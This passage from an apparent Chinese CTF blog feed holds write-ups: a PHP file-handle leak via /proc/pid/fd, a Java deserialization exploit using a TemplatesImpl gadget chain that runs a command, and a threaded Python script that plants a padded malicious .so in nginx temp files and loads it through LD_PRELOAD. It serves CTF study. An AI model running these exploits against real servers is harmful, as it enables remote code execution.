alt="image.png"></p><p>这里出题人翻了symlink函数对应的底层c源码，寻找他其中返回false的情况</p><p>$filename的长度设置为4096以上，会导致symlink返回false</p><p>下面还有一点，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/:|phar|\/\/|php/im&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="variable">$contents</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$contents</span>,<span class="string">&quot;flag&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">filewrite</span>(<span class="variable">$filename</span>,<span class="string">&quot;Don&#x27;t give me flag!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220518201617-ruto186.png" alt="image.png"></p><p>这里的<code>$f = fopen($filename,&quot;r&quot;);</code>句柄未关闭，导致可以在&#x2F;proc&#x2F;pid&#x2F;fd&#x2F;fd下读到，且距离die还贴心的给了2秒钟让你爆破</p><p>从而可以读到flag内容</p><p>剩下的是一些调试上的问题，可惜还没有开始玩底层php，这道题之后有时间再看c源码吧</p><p><a href="http://max666.fun/21.html">http://max666.fun/21.html</a></p><h2 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>依赖：</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220519185250-d1r913u.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IndexController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/warmup&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Class type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyInvocationHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        Method[] methods = <span class="built_in">this</span>.type.getDeclaredMethods();</span><br><span class="line">        Method[] var5 = methods;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> methods.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">xmethod</span> <span class="operator">=</span> var5[var7];</span><br><span class="line">            xmethod.invoke(args[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在问题就是远程打不通，本地通了，猜测是serialVersionUID的问题，这个明天问了佬再解决。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.warmup.MyInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.util.Utils;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> Exp.createTemplatesImpl(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">MyInvocationHandler</span> <span class="variable">myInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyInvocationHandler</span>(TemplatesImpl.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(myInvocationHandler,<span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> (Comparator) Proxy.newProxyInstance(MyInvocationHandler.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Comparator.class &#125;,myInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl,templatesImpl&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Utils.objectToHexString(queue);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        <span class="type">byte</span>[] b = Utils.hexStringToBytes(s);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">createTemplatesImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//修改Neo类，插入command，创建恶意字节码，此处参考ysoserial</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.getCtClass(StubTransletPayload.class.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">                command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">                <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;s&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">dasctf4月赛部分web题解</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>nginx缓存带来的临时文件</title>
    <link href="https://xianbeil.github.io/2022/05/16/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/"/>
    <id>https://xianbeil.github.io/2022/05/16/nginx%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</id>
    <published>2022-05-16T13:07:26.000Z</published>
    <updated>2022-06-01T05:58:03.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于文件上传"><a href="#关于文件上传" class="headerlink" title="关于文件上传"></a>关于文件上传</h1><blockquote><p>来自于ctfshow技术分享</p></blockquote><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220515225958-75i1tsg.png" alt="image.png"></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="PHP临时文件机制"><a href="#PHP临时文件机制" class="headerlink" title="PHP临时文件机制"></a>PHP临时文件机制</h2><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p><p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型，如果浏览器提供该信息的支持，例如<span class="string">&quot;image/gif&quot;</span>。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 该文件上传的错误代码，上传成功其值为<span class="number">0</span>，否则为错误信息。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端存储的临时文件名</span><br></pre></td></tr></table></figure><p>在临时文件包含漏洞中<code>$_FILES[&#39;userfile&#39;][&#39;name&#39;]</code>这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。</p><h3 id="储存目录"><a href="#储存目录" class="headerlink" title="储存目录"></a>储存目录</h3><p>临时目录由php.ini的<code>upload_tmp_dir</code>属性指定。假如<code>upload_tmp_dir</code>的路径不可写，PHP会上传到系统默认的临时目录中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Linux:</span><br><span class="line">/tmp/</span><br><span class="line"></span><br><span class="line">Win:</span><br><span class="line">C:/Windows/</span><br><span class="line">C:/Windows/Temp/</span><br></pre></td></tr></table></figure><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p><p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p><h1 id="nginx缓存"><a href="#nginx缓存" class="headerlink" title="nginx缓存"></a>nginx缓存</h1><h2 id="body-buffer"><a href="#body-buffer" class="headerlink" title="body_buffer"></a>body_buffer</h2><p>官方文档：<a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size</a></p><p><code>client_body_buffer_size</code>这个参数，也就是nginx关于上传的配置处</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190135-d1k6fp6.png" alt="image.png"></p><p>设置读取客户端请求正文的缓冲区大小。 如果请求正文大于缓冲区，则将整个正文或仅其部分写入临时文件。 默认情况下，缓冲区大小等于两个内存页。 这是 x86、其他 32 位平台和 x86-64 上的 8K。 在其他 64 位平台上通常为 16K。</p><p>也就是说当body中数据的大于16k的时候就会有临时文件写入。</p><p><code>client_body_in_file_only</code>，默认是关闭</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190740-9c11zzu.png" alt="image.png"></p><p>确定 nginx 是否应将<em>整个客户端请求正文</em>保存到文件中。 该指令可以在调试期间使用，或者在使用 $request_body_file 变量或模块 ngx_http_perl_module 的 $r-&gt;request_body_file 方法时使用。</p><p>当设置为 on 时，临时文件在请求处理后不会被删除。</p><p>值 clean 将导致请求处理后留下的临时文件被删除。</p><p><code>client_body_temp_path</code>，关于临时文件的存放目录</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516190938-aotwaea.png" alt="image.png"></p><p>定义一个目录，用于存储保存客户端请求正文的临时文件。 指定目录下最多可以使用三级子目录层次结构。 例如，在以下配置中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client_body_temp_path /spool/nginx/client_temp <span class="number">1</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>临时文件的目录就会像下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/spool/nginx/client_temp/<span class="number">7</span>/<span class="number">45</span>/<span class="number">00000123457</span></span><br></pre></td></tr></table></figure><p>因此当我们的请求body大于16k的时候，他就会生成缓存到上面这个目录，但是马上又删除了，但是他删除以后，又继续进行了修改和访问</p><p>就可以通过&#x2F;proc&#x2F;PID&#x2F;fd&#x2F;{}来访问到这个临时文件</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>如果我们的so文件临时膨胀到16k以上，也就是在so文件之后加入垃圾字节，就能够让so文件被存入到临时文件中去。</p><h3 id="例：ctfshow-web818"><a href="#例：ctfshow-web818" class="headerlink" title="例：ctfshow web818"></a>例：ctfshow web818</h3><p>直接学习羽师傅脚本即可，他这里是用socket库来进行网络请求的。</p><p>关键点是31行的恶意字节填充，让hack.so的文件内容写入nginx产生的临时文件</p><p>接着用bruter函数对proc目录进行一个爆破即可，这里的pid题目中会给到，所以只用爆破后面的fd即可</p><p>羽师傅的脚本真的清晰，学习了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">port= <span class="number">28118</span></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET / HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line">data=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">s.close()</span><br><span class="line">pid = re.findall(<span class="string">&#x27;(.*?) www-data&#x27;</span>,data)[<span class="number">0</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(pid)</span><br><span class="line">l=<span class="built_in">str</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>)).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">x=<span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Content-Length: &#x27;&#x27;&#x27;</span>+l+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>+<span class="built_in">open</span>(<span class="string">&#x27;../hack.so&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()+<span class="string">b&#x27;\n&#x27;</span>*<span class="number">1024</span>*<span class="number">200</span>+<span class="string">b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">s.send(x)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bruter</span>():</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">for</span> fd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">40</span>):</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,port))</span><br><span class="line">s.send(<span class="string">f&#x27;&#x27;&#x27;GET /?env=LD_PRELOAD=/proc/<span class="subst">&#123;pid&#125;</span>/fd/<span class="subst">&#123;fd&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">User-Agent: yu22x</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">2048</span>).decode())</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    t = threading.Thread(target=upload)</span><br><span class="line">    t.start()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    a = threading.Thread(target=bruter)</span><br><span class="line">    a.start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fastcgi-buffer"><a href="#fastcgi-buffer" class="headerlink" title="fastcgi_buffer"></a>fastcgi_buffer</h2><p><a href="http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering">http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering</a></p><p><code>fastcgi_buffers</code></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516205014-a325727.png" alt="image.png"></p><p>当启用来自 FastCGI 服务器的响应缓冲时，限制在响应尚未完全读取时可能正忙于向客户端发送响应的缓冲区的总大小。 同时，其余缓冲区可用于读取响应，并在需要时将部分响应缓冲到临时文件。 默认情况下，大小受 fastcgi_buffer_size 和 fastcgi_buffers 指令设置的两个缓冲区的大小限制。</p><p><code>fastcgi_temp_path</code></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220516205217-kaxreg3.png" alt="image.png"></p><p>a temporary file might look like this:</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/spool/nginx/fastcgi_temp/7/45/00000123457</span><br></pre></td></tr></table></figure></blockquote><p>同样对于fastcgi缓存的利用也和上面的body_buffer利用思路一样，只是临时文件保存的目录变了</p>]]></content>
    
    
    <summary type="html">本文重点还是后面的nginx缓存，并给出可以基于此改写的攻击脚本，测试可用。</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="nginx" scheme="https://xianbeil.github.io/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow常用姿势</title>
    <link href="https://xianbeil.github.io/2022/05/16/ctfshow%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://xianbeil.github.io/2022/05/16/ctfshow%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</id>
    <published>2022-05-16T12:47:02.000Z</published>
    <updated>2022-06-02T00:37:08.690Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-常用姿势"><a href="#ctfshow-常用姿势" class="headerlink" title="[ctfshow]常用姿势"></a>[ctfshow]常用姿势</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>一些近两年来比赛中常用到的姿势</p><h1 id="web801-flask算pin"><a href="#web801-flask算pin" class="headerlink" title="web801 flask算pin"></a>web801 flask算pin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> 